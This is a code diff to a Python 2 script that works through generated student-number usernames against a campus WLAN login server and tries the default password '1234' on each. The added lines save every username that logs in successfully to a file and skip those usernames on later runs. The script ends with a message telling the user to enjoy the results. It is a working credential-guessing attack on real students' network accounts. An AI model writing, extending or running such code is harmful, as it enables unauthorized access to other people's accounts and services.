@@ -20,7 +20,7 @@
 # 估计HIT和REFER等192.168.108.13需要进行调整
 # 注意：茶水不好喝
 
-import urllib, urllib2, cookielib
+import urllib, urllib2, cookielib, io
 
 school_list = []
 
@@ -60,6 +60,10 @@ def post3(usrname, pwd):
     response = u.read().decode('utf-8').encode('gbk')
     if 'login_ok' == response:
         print usrname, pwd, response
+        
+        fileHandle = open("hit_wlan.account","a")
+        fileHandle.write(usrname+'\n')
+        fileHandle.close()
 
         body = {
             'action': 'logout',
@@ -94,7 +98,13 @@ def main():
                         p = '0'+str(person)
                     else:
                         p = str(person)
-                    post3('1'+str(i)+str(school)+'0'+str(clas)+p, '1234')
+
+                    fileHandle = open("hit_wlan.account",'r')
+                    fileData = fileHandle.read()
+                    fileHandle.close()
+                    usrname = '1'+str(i)+str(school)+'0'+str(clas)+p
+                    if usrname not in fileData:
+                        post3(usrname, '1234')
 
     print "查找完毕，享受去吧~~"
 
